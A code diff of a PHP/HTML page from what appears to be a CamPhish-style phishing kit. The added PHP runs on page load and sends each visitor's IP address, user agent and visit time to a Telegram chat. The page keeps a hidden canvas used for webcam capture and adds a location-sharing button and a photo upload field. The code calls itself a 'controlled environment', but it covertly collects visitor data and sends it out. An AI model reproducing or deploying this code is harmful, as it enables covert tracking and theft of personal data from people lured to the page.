@@ -1,15 +1,23 @@
+<?php
+require_once __DIR__ . '/ip_utils.php';
+require_once __DIR__ . '/telegram.php';
+
+$ip = get_client_ip();
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+$ts = gmdate('c');
+
+$msg = "👋 <b>Nueva visita en entorno controlado</b>\n".
+       "📌 IP: $ip\n".
+       "🖥️ UA: $ua\n".
+       "⏰ Hora: $ts";
+send_to_telegram($msg);
+?>
+
 <!doctype html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>CamPhish Controlado</title>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-<script src="app.js"></script>
-<style>
-.video-wrap { width: 640px; height: 480px; overflow: hidden; margin-bottom: 10px; }
-video { width: 100%; height: 100%; }
-canvas { display: none; }
-</style>
+<link rel="stylesheet" href="assets/style.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
 </head>
 <body>
 
@@ -18,12 +26,14 @@ canvas { display: none; }
 </div>
 
 <canvas id="canvas" width="640" height="480"></canvas>
-<span id="errorMsg"></span>
 
-<iframe id="Live_YT_TV" width="100%" height="500px" 
-        src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" 
-        frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" 
-        allowfullscreen></iframe>
+<button id="btnLocate">Enviar ubicación</button>
+<div id="locStatus"></div>
+<pre id="locData"></pre>
 
+<input type="file" id="photoInput" accept="image/*">
+<div id="photoStatus"></div>
+
+<script src="assets/script.js"></script>
 </body>
 </html>
